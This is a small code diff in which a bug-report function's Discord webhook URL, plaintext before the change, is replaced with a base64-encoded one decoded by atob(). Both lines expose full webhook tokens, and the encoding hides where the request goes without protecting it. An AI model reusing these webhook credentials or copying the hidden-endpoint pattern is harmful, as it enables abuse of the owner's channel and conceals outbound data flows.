@@ -73,7 +73,7 @@
 
         function send(text){
             const request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/1226202095275872357/0_Ckr38OdMNTItcr1sNyWWa6cr9ZV6AgVVyUmaDijbUByC2Cu7CXbJUyHxfHfLo_Iw3K");
+            request.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMTg3NDAyODE2Nzc2MTk3Mi9xMWt3SU1NM2taeTNTRzFxMFFlU3AzRHR3UTNkQXZ2Z0hwMi1qR01VTXp6bDJKbHZucFFaa0Z1RTM5SEhrVlA5elVtag==");
             request.setRequestHeader('Content-type', 'application/json');
             const params = {
                 username: "report bug",
